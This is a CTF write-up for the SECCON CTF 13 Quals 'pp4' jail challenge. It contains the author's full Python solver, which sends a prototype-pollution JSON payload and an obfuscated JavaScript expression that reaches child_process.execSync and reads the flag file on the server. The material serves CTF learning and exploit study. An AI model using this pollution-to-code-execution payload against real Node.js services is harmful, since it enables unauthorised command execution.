---
title: "Pp4 - SECCON CTF 13 Quals 2024"
category: "misc"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "prototype-pollution", "pp4", "misc", "seccon-ctf-13-quals"]
summary: "Let's enjoy the polluted programming💥"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/jail/pp4"
license: "none stated"
ctf:
  name: "SECCON CTF 13 Quals"
  year: 2024
  challenge: "Pp4"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/jail/pp4>
- **CTF:** SECCON CTF 13 Quals 2024

---

# [jail] pp4

## Description

Let's enjoy the polluted programming💥

```
nc pp4.seccon.games 5000
```

## Attachments

- [pp4](files)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:
```
docker run -it \
    -e SECCON_HOST=localhost \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202411_SECCON_CTF_13_Quals/jail/pp4/solver/exploit.py>

```python
import pwn
import os
import json

pwn.context.log_level = "debug"


def connect() -> pwn.remote:
    return pwn.remote(
        os.getenv("SECCON_HOST", "localhost"), os.getenv("SECCON_PORT", "5000")
    )


command = "cat /flag-*.txt"

with connect() as io:
    io.sendlineafter(
        b"Input JSON: ",
        json.dumps(
            {
                "__proto__": {
                    "": "filter",
                    "filter": "constructor",
                    "function filter() { [native code] }": f"return global.process.mainModule.require('child_process').execSync('{command}').toString()",
                },
            }
        ).encode(),
    )
    io.sendlineafter(
        b"Input code: ",
        b"[][[][[]]][[][[]][[][[]]]]([][[][[][[]]]])()",
    )
    print(io.recvline().decode().strip())
```
